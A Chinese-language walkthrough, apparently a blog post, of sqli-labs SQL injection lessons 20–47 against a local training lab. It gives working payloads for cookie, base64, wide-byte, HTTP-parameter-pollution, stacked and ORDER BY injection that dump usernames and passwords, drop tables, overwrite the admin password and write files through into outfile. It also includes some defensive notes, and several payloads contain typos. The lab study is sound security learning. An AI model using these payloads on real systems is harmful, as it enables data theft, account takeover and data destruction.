先在登录时burpsuite拦截登陆报文，将登陆报文直接发送，后又有一个GET报文，如下图： cookie成功获取uname，然后修改报文并发送 12cookie: uname=admin' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#//成功获取到数据库版本 其余注入方式跟前面的一样，但是只能在burpsuite（拦截报文和修改报文工具）上进行，不然会获取不到相应的信息。 less21直接键入正确的账号密码进行结果测试，发现在形式上与less20一致，区别在于返回的cookie获取到的uname使用base64进行加密。 查看后台的源码 1setcookie('uname', base64_encode($row1['username']), time()+3600); 所以我们在处理playload时先要将查询语句进行base64加密，然后与less20是一致的。然后再后端接受uname时对uname进行了单引号和括号处理。 123//admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#cookie：uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj 这边有点奇怪，使用站长之家的base64加密方式放进去是无法注入出来的，最后使用的加密站点：https://www.bejson.com/enc/base64/才能注入出来，或许是加密的模式不一样吧。 less22该关卡直接键入admin账号密码发现返回是跟less21是一样的，查看源码发现，只是将uname的处理进行了改变，uname进行了双引号的处理。 1$cookee1 = '\"'. $cookee. '\"'; 所以playload是跟前面一样的 12//admin\" and extractvalue(1,concat(0x7e,(select @@version),0x7e))#cookie:uname=YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSkpIw== 第二部分/page-2 Adv Injectionsless23界面的提示与less1一样 1Please input the ID as parameter with numeric value 通过get方式进行传输参数ID，但是ID有什么特殊的处理，暂时还不知道。尝试通过id=1和id=1‘，发现有回显报错。 1near ''1'' LIMIT 0,1' at line 1 查看源码： 123456789$id=$_GET['id'];//filter the comments out so as to comments should not work$reg = \"/#/\";$reg1 = \"/--/\";$replace = \"\";$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 通过源码发现，后端对id进行了#和--注释符号进行过滤，并对id进行单引号处理。 1http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,@@version,'3 此时sql查询语句为： 1select * from users where id='-1' union select 1,@@version,'3' limit 0,1 explain: id=-1,sql查询语句执行了两个select语句，第一个select为id的选择语句，第二个为我们构造的select语句，只有一个数据可以输出，为让我们构造的数据可以正常输出，第一个select要没有输出结果，所以使用-1或者超过整个数据库所有数据都可以 -1’ union select 1,@@version,’3 第一个‘（单引号)闭合-1，第二个&#39;(单引号)闭合后面的，这样查询结果内容显示在username处 此处还可以使用报错注入和延时注入，使用 or ’1‘=’1 进行闭合 1http://localhost/sqli-labs-master/Less-23/?id=1' or extractvalue(1,concat(0x7e,database())) or '1'='1 12345678910//获取数据库名http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(schema_name)from information_schema.schemata),'3//获取security数据库下的表格http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security'),'3//获取users表中列名http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),'3//获取用户名http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(username) from security.users limit 0,1),'3//获取用户密码http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(password) from security.users limit 0,1),'3 less24该关卡是二次排序注入的类型，二次排序注入也称为存储型的注入，就是讲可能导致sql注入的字符先y存储到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。二次排序注入的思路： 通过构造ta数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务器进行处理，提交的数据报文请求中可能包含构造的sql语句或者命令 服务器端应用程序将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出相应 向服务器发送第二个与第一个不同的请求数据信息 服务端收到提交的第二个请求信息后，为处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致第一次请求中构造的sql语句或者命令在服务器中被执行。 服务器返回执行的处理结果数据信息，可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。 在该关卡中，我们主要的步骤是注册一个admin‘#的账号，接下来登陆该账号后进行修改密码，此时被修改的是admin密码。查看后端的源码： pass_changge.php 1$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \"; 当修改admin’#密码时，将会执行 1update users set password='$pass' where username='admin'#' and password='$curr_pass'\"; 发现只会执行前半部分，即 1update users set password='$pass' where username='admin' 具体步骤 (1)初始数据库： (2)创建admin‘#账号 此时查看数据库中的用户信息 (3)登录admin’#账号，并修改密码 (4)查看数据库中的变化 可以看到数据库中已经将admin的密码改为123456 (5)使用admin 123456进行登录 已经成功登录 less25关键代码如下： 1234$id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive)$id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive)$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 本关卡主要是or and过滤，学习怎么绕过or和and过滤，一般是以下几个思路： 大小写变形 Or,OR,oR 编码，hex，urlencode 添加注释 /*or*/ 利用符号 and=&amp;&amp; or=|| 双写，oorr anandd 本关卡主要使用的是第四个方法 报错注入 or示例 1http://172.18.9.91/sqli-labs-master/Less-25/?id=1'|| extractvalue(1,concat(0x7e,database()))-- + And示例 1http://172.18.9.91/sqli-labs-master/Less-25/?id=1 &amp;&amp; 1=1 但是后面的查询我不是很了解，我所使用的双写+union联合查询 1http://172.18.9.91/sqli-labs-master/Less-25/?id=-1' union select 1,2,group_concat(scheme_name) from infoorrmation_schema.schemata -- + 123456http://172.18.9.91/sqli-labs-master/Less-25/?id=-1'union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security' -- +//获取数据库表名http://172.18.9.91/sqli-labs-master/Less-25/?id=-1'nion select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users' -- +//获取users表中的列名http://172.18.9.91/sqli-labs-master/Less-25/?id=-1'union select 1,username,passwoorrd from users where id=5 -- +//获取id为5的用户信息 less25a关键代码 1234$id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive)$id= preg_replace('/AND/i',\"\", $id);$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; 通过关键代码发现，该关卡主要没有包含对于id的单引号，同事没有输出错误项，报错注入不可使用，但是可以采用延时注入和联合注入的方式 1http://172.18.9.91/sqli-labs-master/Less-25a/?id=-1 union select 1,@@version,3# 同样需要使用|| &amp;&amp; 代替or and 1http://172.18.9.91/sqli-labs-master/Less-25a/?id=20 || 1=1 -- + 其余联合查询的的playload与less25时一样的，只要将-1’的单引号去除就行 less26tips:本关卡需要通过liunx环境进行测试，windows部分字符编码无法解析 关键代码 12345678910$id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive)$id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive)$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --$id= preg_replace('/[#]/',\"\", $id); //Strip out #$id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 本关卡将空格，or，and，/*,#,–,/等各种符号进行了过滤，and和or仍旧使用&amp;&amp; 和 || 进行处理，对于注释和结尾字符此处只能利用构造一个 ‘来闭合后面的&#39;，对于空格，有较多的方法： %09 TAB键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB键（垂直） %a0 空格 尝试playload： 1http://172.18.9.91/sqli-labs-master/Less-26/?id=1'%a0||'1 explain：’%a0||’1 此处的 sql 语句为 SELECT * FROM users WHERE id=’1’ || ‘1’ LIMIT 0,1第一个 ‘ 首先闭合 id=’$id’ 中的’ ， %a0 是空格的意思， （ps： 此处我的环境是 ubuntu14.04+apache+mysql+php， 可以解析%a0， 此前在 windows+wamp 测试， 不能解析%a0） 同时%0b 也是可以通过测试的， 其他的经测试是不行的。 ||是或者的意思，‘1 则是为了闭合后面的 ’ 。因此可以构造类似的语句 1http://127.0.0.1/sqli-labs-master/Less-26/?id=100%27union%0bselect%a01,2,3||%271 接下来就只需要更改sql语句即可 less26a该关卡依旧要在liunx环境下进行测试。 关键代码： 1234567891011$id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive)$id= preg_replace('/and/i',\"\", $id); //Strip out AND (non case sensitive)$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --$id= preg_replace('/[#]/',\"\", $id); //Strip out #$id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces$id= preg_replace('/[\\s]/',\"\", $id); //Strip out spaces$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id); //Strip out slashes$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; 这关与 26 的区别在于， sql 语句添加了一个括号， 同时在 sql 语句执行抛出错误后并不在前台页面输出。 所有我们排除报错注入， 这里依旧是利用 union 注入。 1http://127.0.0.1/sqli-labs-master/Less-26a/?id=1')union%a0select%a01,2,3||('1 explain： 基础与 26 一致， 我们直接用 ‘) 闭合前面的， 然后跟上自己构造的注入语句即可。 最后利用（’1 进行闭合即可。 1http://127.0.0.1/sqli-labs-master/Less-26a/?id=1')union%a0select%a01,user(),('3 可将 user()更换为你想要的 sql 语句。 同时该例可以利用延时注入。 less27关键代码： 1234567891011121314$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union/s',\"\", $id); //Strip out union$id= preg_replace('/select/s',\"\", $id); //Strip out select$id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION$id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT$id= preg_replace('/Union/s',\"\", $id); //Strip out Union$id= preg_replace('/Select/s',\"\", $id); //Strip out select 本关卡主要考察union，select和上个关卡过滤掉的字符。上个关卡过滤字符参照上个关卡的处理方式，union，select使用大小写混合的方式进行绕过。 1http://127.0.0.1/sqli-labs-master/Less-27/?id=100'unIon%a0SelEcT%a01,database(),3||'1 tips:uniunionon 也是可以突破限制的。 亦可以利用报错注入和延时注入的语法进行注入 less27a通过源码发现该关卡与less27的主要区别在与id的处理，此处使用的是&quot;进行处理，同时mysql错误不会回显。根据less27playload 1http://127.0.0.1/sqli-labs-master/Less-27a/?id=100\"unIon%a0SelEcT%a01,database(),\"3 TIPs:这里说下以上 payload 我们利用最后的 3 前面的 “ 将后面的 “ 给闭合掉。 或者亦可以利用以前的方法 1,user(),3 || “1， 同时本关可以用延时注入的方法进行注入。 less28关键代码： 123456789$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.//$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out UNION &amp; SELECT. 该关卡与less27差不多的处理，只是将id加了括号的处理，需要进行括号闭合 1http://127.0.0.1/sqli-labs-master/Less-27/?id=1')union%a0select(1),(user()),(3)||'(1 less28a1$id= preg_replace('/union\\s+select/i',\"\", $id); //Strip out spaces. 本关卡与less28一致，只是少点半部分的过滤条件 1http://127.0.0.1/sqli-labs-master/Less-28a/?id=100%27)unIon%0bsElect%0b1,@@basedir,3||(%271 Background-6 服务器（两层）架构 服务器端有两个部分，第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。主要的工作流程为：客户端访问服务器，能直接访问到tomcat服务器，然后tomcat服务器再向apache服务器请求数据。数据返回路径则相反。 环境安装参考：https://blog.csdn.net/qq_43579362/article/details/104298144 中间y有一步是进行sqli-labs进行数据安装步骤，发现无法连接本地数据库，参考博客：https://www.cnblogs.com/NexTen/p/7671280.html 安装完成且在虚拟机可正常访问后，查看kali虚拟机ip，并在物理机浏览器上可直接访问。 这边设计一个知识点，HPP漏洞，即http参数污染，是web容器处理http参数时的问题，比如说： 123比如访问URL:http://www.xxx.com/index.php?str=hello此时，页面显示hello。但如果访问:http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=nmask此时，页面显示nmask，把前面参数的值给覆盖了，这就是http参数污染。参考https://nmask.gitbooks.io/vulnerability-box/webying-yong-lou-dong/urlpath-pollution.html 也就是说当访问页面index.php?id=1&amp;id=2，浏览器所解析显示的是哪个id参数，这要看是什么中间件，若是apache（php）解析的是最后一个参数，即id=2，若为Tomcat（jsp）解析的是第一个参数，即id=1 web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All(List) ASP/IIS Request.QueryString(“par”) All(comma-delimitedstring) 以上为大多数服务器对于参数解析的介绍 这边要注意一个问题，index.jsp?id=1&amp;id=2请求，针对表格中的服务器配置情况，客户端请求首先过tomcat，tomcat解析第一个参数，然后tomcat去请求apache（php）服务器，apache解析最后一个参数，那最终返回客户端的会是哪个参数？实际上应为id=2的内容，应为时间上提供服务的是apapche（php）服务器，返回的数据也应该是apache处理数据，而在实际应用中，也是有两层服务器的情况。往往在tomcat服务器做数据过滤和处理，功能类似为一个WAF，而正因为解析参数的不同，此处可以利用该原理绕过WAF的检测。该用法就是HPP，http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。 less29查看tomcat中的index.jsp文件 在apache的index.php中，sql语句为 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; 因此根据HPP原理，直接上playload： 1http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2' union select 1,user(),3 -- + 其余的playload就像less-1一样 12345678http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2' union select 1,database(),3 -- +//查询数据库名http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- +//查询数据库security下的表名http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'//查询users表中列名http://192.168.159.128:8080/sqli-labs/Less-29/index.jsp?ia=1&amp;id=-2' union select username,password from users where id=3 -- +//查询users表中id=3的用户名和密码 less30less30的原理和less29原理是一致的，区别在与less30中的sql查询语句对id进行了处理 所以我们的playload没有太大的变化 12345678http://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2\" union select 1,2,database() -- +//查询数据库名 securityhttp://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2\" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' -- +//查询数据库security下表名http://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2\" union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- +//查询users表中的列名http://192.168.159.128:8080/sqli-labs/Less-30/index.jsp?id=1&amp;id=-2\" union selecr 1,username,password from users where id=3//查询users表中id=3的用户名和密码 less31less31与前面两个关卡注入方式是一样的，区别在于id的处理上 所以playload为 12345678http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,database() -- +&#x2F;&#x2F;查询数据库名称http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;-- +&#x2F;&#x2F;查询数据库security中表名http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +&#x2F;&#x2F;查询users表中列名http:&#x2F;&#x2F;192.168.159.128:8080&#x2F;sqli-labs&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,username,password from users where id&#x3D;3 -- +&#x2F;&#x2F;查询users表中id&#x3D;3的用户名和密码 总结：从上面的三个关卡，我们获知在不同的服务器总对于参数的处理时不同的，HPP的应用有很多，不仅仅上上述的WAF一个方面，还可执行重复操作，可以执行非法操作等。同事针对WAF的绕过，这边只是一小部分，还有许多方面可以进行研究。 Background-7 宽字节注入less-32,33,34,35,36,37六个关卡是针对&#39;和\\的过滤。宽字节注入的原理和方法： 原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如：%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。在过滤 &#39;的时候往往利用的思路就是将 &#39;转换为\\&#39;（通过转换函数进行） 因此在此想办法将&#39;前面添加的\\除掉，一般是通过以下两种思路： %df除掉\\，具体原因是urlencode(&#39;\\) =%5c%27,在%5c%27前面添加%df，形成%df%5c%27,而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此时%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到目的 将\\&#39;中的\\过滤掉，例如可以构造%**%5c%5c%27的情况，后面的%5会被前面的%5c给注释掉，这也是一种bypass的一种方法 less32利用上述的原理，尝试一下playload： 1http://172.18.9.91/sqli-labs/Less-32/?id=-1%df' union select 1,2,database() -- + 有个奇怪的地方，使用kali2020中（即上一个背景环境）进行测试发现是没有返回数据，通过原先（即前面二十几个关卡的环境）是可以返回原先的值，原因不知道是什么，是因为kali2020自带的mysql数据库是MariaDB的原因吗？ 可以看到，已经绕过了对于&#39;的过滤，从源代码进行考虑： 上述函数为过滤&#39; \\的函数，将&#39;转为\\&#39;,将\\转为\\\\，将&quot;转为\\&quot;。因此此处只能考虑background中的第一个思路，添加%df后将%5c吃掉即可。从上图的input HEX中可以看到df5c27，此处已经将df5c看成是一个字符。 less33本关卡和上关卡的playload是一样的 1http://172.18.9.91/sqli-labs-master/Less-33/?id=-1%df' union select 1,2,database()--+ 从源码中看到： 此处过滤使用的函数为addslashes(),该函数返回在预定义字符之前添加反斜杠的字符串，其中预定义字符为： 单引号（’） 双引号（“） 反斜杠（\\） tips：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。Addslashes()函数和我们在 32 关实现的功能基本一致的， 所以我们依旧可以利用%df 进行绕过。Notice： 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式， 才能防御此漏洞。Mysql_query(“SETcharacter_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn); less34本关卡是post型注入漏洞，同样的也是将post内容进行&#39;\\的处理，由上面的例子可以看到这边的方法就是将过滤函数添加\\吃掉。而get型的方式通过url形式提交，数据会通过urlencode，将该方法用在post型注入中，思路是将utf-8转换为utf-16或者utf-32，例如将 ‘ 转换为utf-16为� ‘ ，就可以利用这个方式进行尝试。 此关卡使用万能密码的方式进行突破。 通过burpsuite进行拦截报文，并将其进行修改成相应的参数，进行注入： 通过结果图可以看到，在没使用密码的情况下获知了账号密码。 原始的 sql 语句为 12@$sql=\"SELECT username, password FROM users WHERE username='$uname'and password='$passwd' LIMIT 0,1\"; 此时 sql 语句为 12SELECT username, password FROM users WHERE username='admin� ' or 1#' andpassword='$passwd' LIMIT 0,1 Explain： SELECT username, password FROM users WHERE username=’admin� ‘ or 1起到作用， 后面的则被#注释掉了。 而起作用的的语句不论 select 选择出来的内 容是什么与 1 进行 or 操作后， 始终是 1。 通过修改limit 后面的数字进行查询不同用户的账号密码。 less35less35和less33大致是一样的，唯一的区别在于sql语句的不同。 1$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; 区别在于id没有经过单引号的处理，所以没有必要考虑check_addslashes()函数的意义，直接提交playload 1http://172.18.9.91/sqli-labs-master/Less-35/?id=-1 union select 1,2,database() -- + less36 从源码看到，在后端check_quotes()函数是利用mysql_real_escape_string()函数进行的过滤。mysql_real_escape_string()函数转义SQL语句中使用的字符中的特殊字符，下列字符受影响： \\x00 \\n \\r \\ ‘ “ \\x1a 如果成功，则该函数返回被转义的字符串，如果失败，则返回false。但是mysql并没有设置成gbk,所以mysql_real_escape_string()依旧可以突破，方法和上述是一样的。 playload： 1http://172.18.9.91/sqli-labs-master/Less-36/?id=-1%EF%BF%BD'union select 1,2,database()--+ 此时使用的&#39;的utf-16进行突破的，也可使用%df进行。 playload: 1http://172.18.9.91/sqli-labs-master/Less-36/?id=-1%df'union select 1,2,database()--+ tip:在使用mysql_real_escape_string()时，要防护这种问题，只需将mysql设置为gbk即可。设置的代码为： 1Mysql_set_charset('gbk','$conn') less-37本关卡与34关卡是大致的，区别在于处理post内容使用的mysql_real_escape_string()函数，而不是addslashes()函数，但是原理是一致的。依旧使用万能密码进行突破。 看到是可以正常登陆的。 总结：从上面几个关卡可以总结一下过滤&#39;\\常用的三种方式是直接replace，addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以在编写代码时需要考虑得更加仔细。 第三部分/page-3 Stacked injectionBackground-8 stacked injectionStacked injections:堆叠注入。从词面的含义就可以看到是一堆sql语句（多条）一起执行，而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样就想到是不是可以多句一起使用，这个就叫做stack injection。 0x01 原理介绍在sql中，分号（；）是用来表示一条sql语句的结束，试想一下在 ； 结束一个sql语句后构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection(联合注入)也是将两条语句合并在一起，两者的区别在于union或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 例如： 用户输入： 1;delete from products 服务器端生成的sql语句为：（因为对输入的参数进行过滤） Select * from products where productid=1;delete from products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 0x02 堆叠注入的局限性堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。堆叠注入可以使用的平台： 虽然堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美，在web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的。 因此，在读取数据时，还是建议使用union（联合）注入。同时在使用堆叠注入之前，需要知道一些数据库相关的信息，例如表名，列名等信息。 0x03 Mysql示例（1）新建表格 select * from users where id=1;create table test like users; 这边看见是已经创建成功，验证一下： (2)删除上面新建的test表，select * from users where id=1;drop table test; (3)查询数据 select * from users where id=1;select 1,2,3; (4)修改数据 select * from users where id=1;insert into users(id,username,password) values(‘100’,’new’,’new’); less-38本关卡就是使用stacked injection的相关知识，在执行select时的sql语句为： 1SELECT * FROM users WHERE id='$id' LIMIT 0,1; 可以直接构造如下的playload: 1http://172.18.9.91/sqli-labs-master/Less-38/index.php?id=1';insert into users(id,username,password) values ('38','less38','hello')--+ 可以看到数据库表中已经将刚刚内容插入进去了。 less39和less38的区别在于sql语句的不一样 1SELECT * FROM users WHERE id=$id LIMIT 0,1 也就是id没有进行处理。构造如下playload： 1http://172.18.9.91/sqli-labs-master/Less-39/?id=1;insert into users(id,username,password) values ('39','less39','hello')--+ 通过数据库查看添加的内容： less40本关卡的sql语句为： 1SELECT * FROM users WHERE id=('$id') LIMIT 0,1 根据sql语句构造相应的playload： 1http://172.18.9.91/sqli-labs-master/Less-40/index.php?id=1');insert into users(id,username,password) values ('40','less40','hello40')--+ less41此处与less39是一致的，区别在于41错误不会回显，所以这边是盲注。 playload: 1http://172.18.9.91/sqli-labs-master/Less-41/index.php?id=1; insert into users(id,username,password) values ('41','less41','hello41')--+ less42update更新数据之后，经过mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生改变。在select调用的时候才能发挥作用，所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。从login.php源码进行分析： Password变量在post过程中，没有通过mysql_real_escape_string()函数的处理，因此在登录的时候密码选项可以进行攻击。 登录用户名随意 密码使用： c&apos;;drop table me# (删除me表) c&apos;;create table me like users# (创建me表)在注入前先查看原来security数据库中的表： 在登录界面随便输入内容，然后使用burpsuite拦截报文，并做相应的修改 当报文发送到后台时，原sql语句为： 1SELECT * FROM users WHERE username='$username' and password='$password' 通过playload构造的sql语句为 1SELECT * FROM users WHERE username='admin' and password='c';create table less42 like users# 利用stacked injection，进入命令行查看是否成功创建表格。 利用c’;drop table less42#作为登录密码，删除该表。 同样的利用此方式可以更新和插入数据项。这边演示通过update进行更改用户admin的密码，然后登录。 less43本关卡从源码来看与less42是一样的原理，主要的区别在于sql语句的不一样。在本关卡sql语句为： 1SELECT * FROM users WHERE username=('$username') and password=('$password') 登录 username：admin password：1&apos;);update users password=&apos;less43&apos; where username=&apos;admin&apos;#具体的演示就不做了，跟上面的一样。 less44本关卡是基于盲注的，主要是没有报错信息，所以采用盲注的方式，但是我觉得有没有报错信息在堆叠注入好像并没有多大关系，也没有看是什么报错，主要还是构造号后面的注入语句。 登录 username:admin password:1&apos;;update users password=&apos;less44&apos; where username=&apos;admin&apos;#具体参看less42 less45本关卡是less43基于盲注的，所以playload是与less43一致，只不过less45没有报错信息，但是并不影响结果。 登录信息： username：admin password：1&apos;;update users password=&apos;less45&apos; where username=&apos;admin&apos;#Background-9 order by 后的injectionless46本关卡开始，是通过order by相关注入知识 该关卡的sql语句为 1SELECT * FROM users ORDER BY $id 尝试?sort=1 desc或者asc，显示的结果不同，则表明可以注入。 从上面的结果看，是可以进行注入，上述的sql语句中可以看到，注入点在order by后面的参数中，而order by 不同于的where后面的注入点，不能使用union等进行注入。关于order by注入的方式，先查看下mysql的官方文档： 可利用order by后的一些参数进行注入： 首先： (1) order by后的数字可以作为一个注入点，也就是构造order by 后的一个语句，让该语句执行结果为一个数，尝试 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=right(version(),1) 没有报错，但是right换成left是一样的，说明数字没有起到作用，考虑使用布尔类型，此时可以使用报错注入和延时注入。 此处可以直接构造？sort=后面的一个参数，此时有三种形式 ①直接添加注入语句，?sort=(select ***) ②利用一些函数，例如rand()函数等。?sort=rand(sql语句) ps：这边看一下rand（true）和rand（false）得结果是不一样的 ③利用and，例如?sort=1 and (加sql语句) 同时，sql语句可以利用报错注入和延时注入的方式，语句可以灵活构造。 报错注入例子： 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) 上述图片看到数据库用户名为root@localhost的用户名 使用rand()进行演示，前面看到rand(true)和rand(false)结果是不一样的。 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=rand(ascii(left(database(),1))=115) 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=rand(ascii(left(database(),1))=116) 从上面的两个图对比rand（true）和rand（false）的结果看。报错注入是成功的。 延时注入的例子： 12http://172.18.9.91/sqli-labs-master/Less-46/?sort= (select if(substring(current,1,1)=char(115),benchmark(50000000,md5('1')),null) from (select database() as current) as tb1)http://172.18.9.91/sqli-labs-master/Less-46/?sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5)) 上述两个延时注入的例子可以看出明显的看出时间的不同。 同时也可以使用?sort=1 and 后添加注入语句 (2)procedure analyse 参数后注入 利用procedure analyse参数，可以执行报错注入，同时，在procedure analyse和order by 之间可以存在limit 参数，实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) (3)导入导出文件 into outfile参数 1http://172.18.9.91/sqli-labs-master/Less-46/?sort=1 into outfile \"D:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\test1.txt\" 将查询结果导入到文件中： 这时就可以使用上传网马，利用lines terminated by 1into outfileD:\\\\phpStudy\\\\WWW\\\\sqli-labs-master\\\\test1.txt lines terminated by 0x(网马进行16进制转换) less47本关卡sql语句为： 1SELECT * FROM users ORDER BY '$id' 将id变成字符型，因此依旧按照注入的位置进行分类。 (1)order by后的参数 只能使用and来进行a报错或者延时注入。 ①and rand 相结合的方式 1http://172.18.9.91/sqli-labs-master/Less-47/index.php?sort=1'and rand(ascii(left(database(),1))=115)--+ 换成116 12http://127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1%27and%20rand(ascii(left(database(),1))=115)--+ mysql天书里面是说会不一样，但是我这边测试是一样的。。。。 此处后期经过测试， 还是存在问题的， 我们不能使用这种方式进行准确的注入。 此处留下只是一个示例。 ②可以利用报错的方式进行 1http://127.0.0.1/sqli-labs-master/Less-47/index.php?sort=1' and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+ 可以看到user()的内容，同时可以构造其他语句进行注入。 ③延时注入 